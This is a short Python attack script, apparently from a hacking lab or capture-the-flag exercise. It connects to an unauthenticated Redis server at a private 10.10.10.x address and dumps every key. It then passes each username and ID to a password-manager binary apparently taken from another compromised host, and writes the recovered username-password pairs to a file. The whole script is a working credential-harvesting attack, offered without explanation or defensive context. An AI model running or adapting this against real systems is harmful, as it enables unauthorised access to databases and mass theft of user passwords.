from redis import Redis
import subprocess


pmanager_pass = "/home/emilien/Desktop/security/10.10.10.53/from_root/pmanager"
redis_link = Redis("10.10.10.132", 6379)
all_keys = redis_link.keys("*")


with open("dump_redis.txt", "w") as f:
    for k in all_keys:
        username = redis_link.get(k).decode('utf-8')
        user_id = k.decode('utf-8')
        ids = f"{username}\n{user_id}\n"
        p = subprocess.run(pmanager_pass, input=ids, stdout=subprocess.PIPE, encoding="ascii")
        print(p.stdout.split('\n')[1])
        password = p.stdout.split('\n')[1]
        f.write(f"{username} {password}\n")    
